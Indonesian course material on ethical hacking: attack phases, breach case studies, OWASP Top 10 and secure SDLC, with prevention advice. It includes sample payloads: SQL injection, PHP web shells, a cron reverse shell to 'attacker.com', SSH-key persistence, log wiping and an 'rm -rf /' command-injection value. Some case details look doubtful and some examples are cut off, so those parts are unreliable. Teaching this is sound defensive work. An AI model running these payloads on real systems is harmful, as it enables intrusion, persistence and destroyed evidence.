1.1 Overview of Ethical Hacking

Ethical Hacking adalah praktik menguji sistem komputer, jaringan, atau aplikasi untuk menemukan kerentanan keamanan sebelum penyerang jahat menemukannya.

Karakteristik Ethical Hacker

  1. Legal Authorization: Memiliki izin tertulis
  2. Ethical Purpose: Tujuan untuk meningkatkan keamanan
  3. Responsible Disclosure: Melaporkan temuan dengan cara yang bertanggung jawab
  4. Professional Standards: Mengikuti standar dan kode etik profesional

Jenis-jenis Hacker

Jenis Tujuan Legalitas
White Hat Meningkatkan keamanan Legal
Black Hat Keuntungan pribadi Ilegal
Gray Hat Campuran Ambigu

Area yang Diuji dalam Ethical Hacking

Ethical hacking mencakup pengujian berbagai aspek keamanan sistem dan infrastruktur

  • Network Security - Keamanan jaringan dan infrastruktur
  • Web Application Security - Keamanan aplikasi web
  • Mobile Application Security - Keamanan aplikasi mobile
  • Wireless Security - Keamanan jaringan nirkabel
  • Cloud Security - Keamanan cloud infrastructure
  • API Security - Keamanan API dan microservices
  • Database Security - Keamanan database
  • IoT Security - Keamanan Internet of Things
  • Social Engineering - Pengujian faktor manusia
  • Physical Security - Keamanan fisik

Network Security - Studi Kasus

1.2 Methodological of Ethical Hacking

Metodologi yang sistematis untuk menguji keamanan sistem

Fase-fase Ethical Hacking

  1. Reconnaissance - Pengintaian
  2. Scanning - Identifikasi sistem
  3. Gaining Access - Eksploitasi kerentanan
  4. Maintaining Access - Mempertahankan akses
  5. Covering Tracks - Menyembunyikan aktivitas
  6. Reporting - Dokumentasi temuan

Fase 1: Reconnaissance (Pengintaian)

Penjelasan: Fase pengumpulan informasi tentang target tanpa melakukan kontak langsung. Dibagi menjadi dua jenis:

Passive Reconnaissance

  • Mengumpulkan info tanpa kontak langsung
  • Tidak meninggalkan jejak
  • Menggunakan sumber publik

Active Reconnaissance

  • Interaksi langsung dengan target
  • Bisa terdeteksi
  • Lebih informatif
Tools: Google dorking, WHOIS, DNS lookup, Shodan, Maltego, theHarvester, OSINT Framework

Fase 1: Reconnaissance - Studi Kasus

Kasus: Target Corporation Breach (2013)

Langkah Reconnaissance:

  1. Attacker menemukan vendor HVAC (Fazio Mechanical) yang memiliki akses ke network Target
  2. Menggunakan Google dorking untuk mencari informasi tentang vendor
  3. Menemukan email phishing target di vendor
  4. Mengumpulkan informasi tentang network architecture melalui public documents

Hasil Reconnaissance:

  • Identifikasi entry point (vendor credentials)
  • Network topology information
  • System architecture details
  • Security controls yang digunakan
Dampak: 40 juta kartu kredit dicuri, 70 juta customer records ter-expose

Fase 2: Scanning (Identifikasi Sistem)

Penjelasan: Mengidentifikasi sistem target secara aktif untuk menemukan informasi teknis seperti:

  • Port Scanning: Mengidentifikasi port yang terbuka
  • Service Detection: Menentukan service yang berjalan
  • OS Fingerprinting: Mengidentifikasi sistem operasi
  • Vulnerability Scanning: Mencari known vulnerabilities
  • Network Mapping: Membuat peta network topology
Tools: Nmap, Nessus, OpenVAS, Masscan, Nikto, Burp Suite, OWASP ZAP

Fase 2: Scanning - Studi Kasus

Kasus: Equifax Breach (2017)

Langkah Scanning:

  1. Port scanning mengidentifikasi Apache Struts framework
  2. Service detection menemukan versi Struts 2.3.x
  3. Vulnerability scanning mengidentifikasi CVE-2017-5638
  4. Network mapping menemukan akses ke database internal

Hasil Scanning:

  • Apache Struts 2.3.x dengan vulnerability known
  • Port 443 (HTTPS) terbuka
  • Database port (3306) accessible dari web server
  • No WAF (Web Application Firewall) detected
Dampak: 147 juta records dicuri termasuk SSN, kartu kredit, data pribadi

Fase 3: Gaining Access (Eksploitasi Kerentanan)

Penjelasan: Fase dimana attacker mengeksploitasi vulnerability yang ditemukan untuk mendapatkan akses ke sistem:

  • Exploitation: Menggunakan exploit untuk vulnerability
  • Privilege Escalation: Meningkatkan level akses
  • Initial Access: Mendapatkan foothold di sistem
  • Code Execution: Mengeksekusi kode berbahaya
Tools: Metasploit, Burp Suite, SQLMap, Exploit-DB, Custom exploits, Social Engineering Toolkit

Fase 3: Gaining Access - Studi Kasus

Kasus: Sony Pictures Hack (2014)

Langkah Gaining Access:

  1. Menggunakan SQL injection pada login form
  2. Bypass authentication dengan SQL payload
  3. Upload web shell melalui file upload vulnerability
  4. Mendapatkan remote code execution
  5. Privilege escalation ke administrator

Hasil Gaining Access:

  • Full access ke web server
  • Database credentials compromised
  • Access ke internal network
  • Administrator privileges
Dampak: 100TB data dicuri, email internal leaked, film unreleased di-publish

Fase 3: Gaining Access - Contoh Teknik

// SQL Injection untuk bypass login
Username: admin' OR '1'='1
Password: anything

// Upload web shell
<?php system($_GET['cmd']); ?>

// Remote Code Execution via Apache Struts
POST /struts2-showcase/fileupload/upload.action
Content-Type: multipart/form-data
// Exploit CVE-2017-5638

Fase 4: Maintaining Access (Mempertahankan Akses)

Penjelasan: Setelah mendapatkan akses, attacker perlu mempertahankan akses untuk tujuan jangka panjang:

  • Backdoors: Membuat akses tersembunyi
  • Rootkits: Menyembunyikan aktivitas malicious
  • Trojans: Malware yang memberikan remote access
  • Persistence: Memastikan akses tetap ada setelah reboot
  • Lateral Movement: Bergerak ke sistem lain di network
Tools: Netcat, Meterpreter, Cobalt Strike, Empire, PoshC2, Custom backdoors

Fase 4: Maintaining Access - Studi Kasus

Kasus: Marriott/Starwood Breach (2014-2018)

Langkah Maintaining Access:

  1. Install backdoor pada compromised server
  2. Create persistent connection ke C&C server
  3. Install additional backdoors di multiple servers
  4. Lateral movement ke database servers
  5. Maintain access selama 4 tahun tanpa terdeteksi

Teknik yang Digunakan:

  • Web shells di multiple locations
  • SSH keys untuk persistent access
  • Scheduled tasks untuk backdoor
  • Encrypted C&C communication
  • Anti-forensics techniques
Dampak: 500 juta records dicuri, akses selama 4 tahun, $123 juta denda GDPR

Fase 4: Maintaining Access - Contoh Teknik

// Backdoor via cron job
* * * * * /usr/bin/nc attacker.com 4444 -e /bin/bash

// Web shell untuk persistent access
<?php
if (isset($_GET['pass']) && $_GET['pass'] == 'secret') {
    eval($_POST['cmd']);
}
?>

// SSH key untuk persistent access
echo "ssh-rsa AAAAB3..." >> ~/.ssh/authorized_keys

Fase 5: Covering Tracks (Menyembunyikan Aktivitas)

Penjelasan: Menghapus atau menyembunyikan jejak aktivitas untuk menghindari deteksi:

  • Log Deletion: Menghapus log entries
  • Log Manipulation: Memodifikasi log untuk menyembunyikan aktivitas
  • Anti-Forensics: Menghapus file dan tools yang digunakan
  • Steganography: Menyembunyikan data dalam file lain
  • Encryption: Mengenkripsi komunikasi dan data
Tools: Log cleaners, Timestomping tools, Anti-forensics tools, Steganography tools, Encryption tools

Fase 5: Covering Tracks - Studi Kasus

Kasus: Target Breach (2013)

Langkah Covering Tracks:

  1. Menghapus log entries dari access logs
  2. Menggunakan timestomping untuk mengubah file timestamps
  3. Menghapus temporary files dan tools
  4. Mengenkripsi exfiltrated data
  5. Menggunakan encrypted channels untuk C&C

Teknik yang Digunakan:

  • Log file manipulation
  • File timestamp modification
  • Process hiding
  • Encrypted data exfiltration
  • Anti-forensics tools
Catatan: Meskipun melakukan covering tracks, aktivitas masih terdeteksi setelah 2 minggu

Fase 5: Covering Tracks - Contoh Teknik

// Menghapus log entries
sed -i '/attacker_ip/d' /var/log/apache2/access.log

// Timestomping (mengubah timestamp file)
touch -t 202001010000 malicious_file.php

// Menghapus history
history -c
rm ~/.bash_history

// Mengenkripsi data sebelum exfiltration
tar czf - sensitive_data | openssl enc -aes-256-cbc > encrypted.tar.gz

  • Remediation: Rekomendasi perbaikan

Berikut adalah studi kasus lengkap yang dapat digunakan sebagai bahan praktek untuk memahami setiap fase ethical hacking

Praktek Fase 1: Reconnaissance

Tujuan: Mengumpulkan informasi tentang target tanpa melakukan kontak langsung

Langkah-langkah Praktek:

  1. Google Dorking - Cari informasi publik tentang website
  2. WHOIS Lookup - Cari informasi domain dan pemilik
  3. DNS Lookup - Identifikasi subdomain dan DNS records
  4. Social Media - Cari informasi di social media

# - DNS servers

Tujuan: Mengidentifikasi sistem, port terbuka, dan vulnerability

A01:2021 ‚Äì Broken Access Control

Deskripsi: Pengguna dapat mengakses data atau fungsi yang tidak seharusnya mereka akses

Dampak: Akses tidak sah ke data sensitif, modifikasi data, penghapusan data
Prevalensi: 94% aplikasi web memiliki vulnerability ini (paling umum!)

A01: Broken Access Control - Penjelasan Detail

Access control menentukan apakah pengguna memiliki izin untuk melakukan tindakan tertentu. Ketika kontrol ini rusak:

  • Pengguna dapat memodifikasi URL atau parameter untuk mengakses resource orang lain
  • API tidak memverifikasi apakah pengguna memiliki hak akses
  • Metadata exposure - aplikasi mengungkapkan informasi sensitif
  • CORS misconfiguration memungkinkan domain tidak terpercaya mengakses API

A01: Broken Access Control - Contoh

IDOR (Insecure Direct Object Reference):

// Vulnerable URL
http://bank.com/account.php?id=12345
http://bank.com/account.php?id=67890  // Bisa akses akun orang lain!

// Horizontal Privilege Escalation
http://ecommerce.com/order.php?user_id=100&order_id=500
// User biasa bisa lihat order user lain
Real-world: Facebook bug tahun 2018 memungkinkan pengguna melihat foto private pengguna lain dengan memodifikasi URL

A01: Broken Access Control - Contoh Kasus Real-World

1. Facebook Photo Bug (2018)

Pengguna dapat melihat foto private dengan memodifikasi URL parameter. 6.8 juta pengguna terpengaruh.

2. GitHub Access Token Leak (2017)

Token akses GitHub ter-expose melalui URL, memungkinkan akses ke repository private.

3. Panera Bread Data Breach (2018)

API tidak memverifikasi akses, memungkinkan siapa saja melihat data pelanggan termasuk nama, email, alamat, dan nomor telepon.

A01: Broken Access Control - Contoh Lain

  • Vertical Privilege Escalation: User biasa bisa akses admin panel
  • Path Traversal: Akses file di luar direktori yang diizinkan
  • CORS Misconfiguration: Domain tidak terpercaya bisa akses API
// Path Traversal
http://example.com/view.php?file=../../../etc/passwd

// CORS Misconfiguration
Access-Control-Allow-Origin: *

A01: Broken Access Control - Cara Mencegah

  • Selalu verifikasi authorization di setiap endpoint
  • Gunakan access control list (ACL) atau role-based access control (RBAC)
  • Jangan mengandalkan parameter yang dapat dimodifikasi user (IDOR)
  • Implementasikan proper CORS policy
  • Gunakan UUID atau random ID, bukan sequential ID
  • Log semua akses yang ditolak untuk monitoring

A02:2021 ‚Äì Cryptographic Failures

Deskripsi: Data sensitif tidak terenkripsi dengan benar atau menggunakan enkripsi yang lemah

Dampak: Pencurian data sensitif (password, kartu kredit, data pribadi)
Catatan: Sebelumnya disebut "Sensitive Data Exposure" di OWASP Top 10 2017

A02: Cryptographic Failures - Penjelasan Detail

Kegagalan kriptografi terjadi ketika:

  • Data sensitif tidak dienkripsi saat transit (HTTP bukan HTTPS)
  • Data tidak dienkripsi saat disimpan (at rest)
  • Menggunakan algoritma hash yang lemah (MD5, SHA-1)
  • Password tidak di-hash dengan salt yang unik
  • Kunci enkripsi yang lemah atau hardcoded
  • Data sensitif muncul di log files atau error messages

A02: Cryptographic Failures - Contoh

// Password dalam plaintext di database
INSERT INTO users (username, password) 
VALUES ('admin', 'password123');

// Menggunakan algoritma lemah
$hash = md5($password);  // MD5 sudah tidak aman!

// Data tidak terenkripsi saat transit
http://example.com/login.php  // Bukan HTTPS
Real-world: LinkedIn breach tahun 2012 - 6.5 juta password di-hash dengan SHA-1 tanpa salt, mudah di-crack

A02: Cryptographic Failures - Contoh Kasus Real-World

1. LinkedIn (2012)

6.5 juta password di-hash dengan SHA-1 tanpa salt. Password mudah di-crack menggunakan rainbow tables.

2. Adobe (2013)

153 juta user records dicuri. Password di-hash dengan algoritma lemah (3DES ECB), 38 juta dalam plaintext.

3. Yahoo (2013-2014)

3 miliar akun dicuri. Password di-hash dengan MD5 (sangat lemah). Merupakan salah satu breach terbesar dalam sejarah.

4. Equifax (2017)

147 juta records dicuri termasuk SSN, kartu kredit. Data tidak terenkripsi dengan baik.

A02: Cryptographic Failures - Contoh Lain

  • Menggunakan SSL/TLS versi lama (SSLv3, TLS 1.0)
  • Kunci enkripsi yang lemah atau hardcoded
  • Data sensitif di log files
  • Kartu kredit disimpan tanpa enkripsi
// Hardcoded encryption key
define('ENCRYPTION_KEY', '12345678');  // Sangat lemah!

// Log sensitive data
error_log("User password: " . $password);

A02: Cryptographic Failures - Cara Mencegah

  • Selalu gunakan HTTPS (TLS 1.2+) untuk data transit
  • Enkripsi data sensitif saat disimpan (at rest)
  • Gunakan algoritma hash yang kuat: bcrypt, Argon2, PBKDF2
  • Selalu gunakan salt yang unik untuk setiap password
  • Jangan hardcode encryption keys - gunakan key management
  • Jangan log data sensitif (password, kartu kredit, SSN)
  • Gunakan HSTS (HTTP Strict Transport Security)
  • Disable weak cipher suites

A03:2021 ‚Äì Injection

Deskripsi: Data tidak divalidasi dan memungkinkan eksekusi kode berbahaya

Dampak: Akses database, eksekusi command, akses file system
Prevalensi: 19% aplikasi memiliki SQL injection vulnerability

A03: Injection - Penjelasan Detail

Injection terjadi ketika aplikasi mengirim data yang tidak terpercaya ke interpreter tanpa validasi:

  • SQL Injection: Menyuntikkan SQL code ke dalam query database
  • Command Injection: Mengeksekusi command sistem operasi
  • NoSQL Injection: Menyuntikkan query NoSQL (MongoDB, etc.)
  • LDAP Injection: Menyuntikkan query LDAP
  • XPath Injection: Menyuntikkan query XPath
  • XML Injection: Menyuntikkan XML code

A03: Injection - SQL Injection

// Vulnerable Code
$query = "SELECT * FROM users 
          WHERE username = '" . $_POST['username'] . "'";

// Exploit
Username: admin' OR '1'='1
Password: anything

// Resulting Query
SELECT * FROM users WHERE username = 'admin' OR '1'='1'

SQL injection memungkinkan akses ke 1 juta user records termasuk email dan password.

// ?host=8.8.8.8; rm -rf /

NoSQL Injection

 "password": {"$ne": null}}

LDAP Injection

// Bypasses authentication

A03: Injection - Cara Mencegah

  • Gunakan Prepared Statements atau Parameterized Queries
  • Selalu validasi dan sanitize input dari user
  • Gunakan whitelist untuk input validation
  • Implementasikan least privilege untuk database user
  • Escape special characters sebelum memproses input
  • Gunakan ORM (Object-Relational Mapping) yang aman
  • Jangan concatenate user input langsung ke query
  • Gunakan stored procedures dengan parameter
// Safe: Prepared Statement

$stmt->execute([$username]);

// Unsafe: String concatenation

A07:2021 ‚Äì Identification and Authentication Failures

Deskripsi: Weak authentication mechanisms, session management yang buruk

Dampak: Account takeover, identity theft, unauthorized access
Prevalensi: 90% aplikasi tidak mengimplementasikan MFA (Multi-Factor Authentication)

A07: Authentication Failures - Penjelasan Detail

Kegagalan authentication dapat terjadi karena:

  • Password policy yang lemah (pendek, tidak kompleks)
  • Password di-hash dengan algoritma lemah atau tanpa salt
  • Tidak ada rate limiting pada login attempts
  • Session management yang buruk (predictable IDs, no timeout)
  • Tidak ada Multi-Factor Authentication (MFA)
  • Weak password recovery mechanism
  • Credential stuffing (reuse password dari breach lain)
  • Session fixation attacks

A07: Authentication Failures - Contoh

// Weak password policy
Password: "123456"  // Diterima!

// Session fixation
session_id = "attacker_controlled_id"
// Attacker bisa akses session korban

// Password dalam plaintext
Database: password = "mypassword123"

// Tidak ada MFA
Login hanya dengan username/password
Real-world: Yahoo breach tahun 2013-2014 - 3 miliar akun dicuri karena weak password hashing dan tidak ada MFA

2. Twitter (2020)

Social engineering attack. Tidak ada MFA untuk high-profile accounts. 130+ akun di-hack termasuk Obama, Biden, Musk.

3. GitHub (2022)

Credential stuffing attack. 100,000+ npm accounts compromised karena password reuse dari breach lain.

4. RockYou (2009)

32 juta password dalam plaintext dicuri. Menjadi basis untuk password cracking dictionaries hingga sekarang.

A07: Authentication Failures - Cara Mencegah

  • Implementasikan strong password policy (min 12 karakter, kompleks)
  • Gunakan MFA (Multi-Factor Authentication) untuk akun penting
  • Hash password dengan algoritma kuat (bcrypt, Argon2) + unique salt
  • Implementasikan rate limiting pada login attempts
  • Gunakan session management yang aman (random IDs, timeout, secure cookies)
  • Deteksi dan blokir credential stuffing attacks
  • Implementasikan account lockout setelah beberapa failed attempts
  • Gunakan password strength meter untuk user
  • Monitor dan alert untuk aktivitas login yang mencurigakan

A08:2021 ‚Äì Software and Data Integrity Failures

Deskripsi: CI/CD pipeline yang tidak aman, update mechanism yang tidak terverifikasi

Dampak: Malicious code injection, supply chain attacks
Catatan: Kategori baru di OWASP Top 10 2021. Fokus pada integrity verification dan supply chain security.

A08: Integrity Failures - Penjelasan Detail

  • Auto-update mechanism tidak memverifikasi signature
  • Dependencies diinstall tanpa integrity checks

  • Tidak ada code signing atau verification
  • Supply chain tidak aman (third-party components compromised)
  • Data tidak memiliki integrity protection (checksums, signatures)

A08: Integrity Failures - Contoh

  • CI/CD pipeline tanpa verifikasi
  • Auto-update tanpa signature verification
  • Dependency dari sumber tidak terpercaya
  • Tidak ada integrity checks

  • Implementasikan least privilege untuk CI/CD systems
  • Monitor dan alert untuk perubahan yang tidak terduga
  • Gunakan trusted repositories dan verify package integrity

A10:2021 ‚Äì Server-Side Request Forgery (SSRF)

Deskripsi: Aplikasi membuat request ke URL yang tidak terpercaya, bypass firewall

Dampak: Akses ke internal resources, port scanning internal, data exfiltration
Catatan: Kategori baru di OWASP Top 10 2021. Sangat berbahaya di cloud environments.

A10: SSRF - Penjelasan Detail

SSRF terjadi ketika aplikasi membuat HTTP request ke URL yang dikontrol oleh attacker:

  • Aplikasi menerima URL dari user tanpa validasi
  • Server membuat request ke URL tersebut
  • Attacker dapat mengarahkan request ke internal resources
  • Bypass firewall karena request berasal dari server (trusted)
  • Dapat mengakses cloud metadata services (AWS, Azure, GCP)
  • Dapat melakukan port scanning internal network
  • Dapat membaca file system melalui file:// protocol

A10: SSRF - Contoh

// Vulnerable code
$url = $_GET['url'];
$content = file_get_contents($url);

// Exploit
?url=http://localhost:3306        // Akses MySQL
?url=file:///etc/passwd           // Baca file system
?url=http://169.254.169.254/      // AWS metadata (cloud)
?url=http://127.0.0.1/admin      // Akses admin panel internal
Real-world: Capital One breach tahun 2019 - SSRF vulnerability memungkinkan akses ke AWS metadata service, 100 juta records dicuri

A10: SSRF - Contoh Kasus Real-World

1. Capital One (2019)

SSRF vulnerability memungkinkan akses ke AWS metadata service. 100 juta records dicuri termasuk SSN dan kartu kredit.

2. GitHub (2020)

SSRF vulnerability di GitHub Actions memungkinkan akses ke internal services dan metadata.

3. Microsoft Exchange (2021)

SSRF vulnerability (ProxyLogon) memungkinkan remote code execution. 250,000+ servers terpengaruh.

4. Docker (2019)

SSRF vulnerability di Docker API memungkinkan akses ke internal Docker daemon dan file system.

A10: SSRF - Attack Vectors

  • Cloud Metadata: AWS, Azure, GCP metadata services
  • Internal Services: Database, admin panels, internal APIs
  • Localhost: Services yang hanya accessible dari server
  • File Protocol: file:// untuk membaca file system
// AWS Metadata
http://169.254.169.254/latest/meta-data/
iam/security-credentials/role-name

// Internal network scan
http://192.168.1.1:8080
http://10.0.0.1/admin

A10: SSRF - Cara Mencegah

  • Validasi dan sanitize semua input URL dari user
  • Gunakan whitelist untuk allowed URLs/hosts
  • Blokir private/internal IP addresses (127.0.0.1, 10.x.x.x, 192.168.x.x)
  • Blokir cloud metadata IPs (169.254.169.254 untuk AWS)
  • Disable redirects atau validasi redirect destinations
  • Gunakan URL parsing library yang aman
  • Implementasikan network segmentation
  • Gunakan outbound firewall rules untuk membatasi akses
  • Validasi response untuk memastikan sesuai dengan yang diharapkan
// Safe: Whitelist validation
$allowedHosts = ['api.example.com', 'cdn.example.com'];
if (!in_array(parse_url($url, PHP_URL_HOST), $allowedHosts)) {
    throw new Exception('Invalid host');
}

1.4 Introduction to Computer Security

Perlindungan sistem komputer dari akses tidak sah, kerusakan, atau pencurian informasi

CIA Triad

Confidentiality

Kerahasiaan - Data hanya dapat diakses oleh pihak yang berwenang

Teknik: Encryption, Access Control

Integrity

Integritas - Data tidak diubah oleh pihak yang tidak berwenang

Teknik: Hashing, Digital Signatures

Availability

Ketersediaan - Data dan sistem tersedia saat dibutuhkan

Teknik: Redundancy, Backup, DDoS Protection

Konsep Keamanan Tambahan

  • Authentication: Verifikasi identitas pengguna
  • Authorization: Penentuan hak akses pengguna
  • Non-repudiation: Tidak dapat menyangkal tindakan
  • Accountability: Dapat dilacak siapa yang melakukan apa

Threat Model

  • Threats: Potensi bahaya terhadap sistem
  • Vulnerabilities: Kelemahan dalam sistem
  • Risks: Kombinasi threat dan vulnerability
  • Countermeasures: Tindakan untuk mengurangi risiko

1.5 Implementation of Secure Programming in The SDLC

Mengintegrasikan praktik keamanan ke dalam setiap fase pengembangan

Fase SDLC dengan Security Integration

  1. Planning & Requirements: Security requirements, Threat modeling
  2. Design: Secure design principles, Security architecture
  3. Development: Secure coding, Code reviews, SAST
  4. Testing: Security testing, DAST, Penetration testing
  5. Deployment: Secure configuration, Environment hardening
  6. Maintenance: Patch management, Security updates

Secure Coding Principles

  • Defense in Depth: Multiple layers of security
  • Least Privilege: Minimum access yang diperlukan
  • Fail Secure: Sistem gagal dalam kondisi aman
  • Input Validation: Selalu validasi input
  • Output Encoding: Encode output untuk mencegah injection
  • Error Handling: Jangan expose informasi sensitif
  • Secure Defaults: Konfigurasi default yang aman
